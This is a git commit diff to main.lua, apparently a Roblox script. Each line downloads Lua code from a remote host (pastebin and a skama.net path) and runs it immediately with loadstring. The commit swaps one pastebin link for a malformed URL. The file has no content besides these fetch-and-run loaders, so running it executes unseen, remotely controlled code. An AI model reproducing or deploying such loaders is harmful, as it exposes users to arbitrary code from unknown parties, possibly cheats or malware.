b59ece7026994dcbe28948cba4f12389f15acd59
waealbert4-lab <waealbert4@gmail.com>
2026-03-14 11:26:26 -0700

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,2 +1,2 @@
-task.spawn(function() loadstring(game:HttpGet("https://pastebin.com/raw/DXK4GnPx"))() end)
+task.spawn(function() loadstring(game:HttpGet("https://https://pastebin.com/L3bCY4iL"))() end)
 task.spawn(function() loadstring(game:HttpGet("https://skama.net/mrr_ccb093a70e7e4bc5b86b08970b52f307/"))() end)
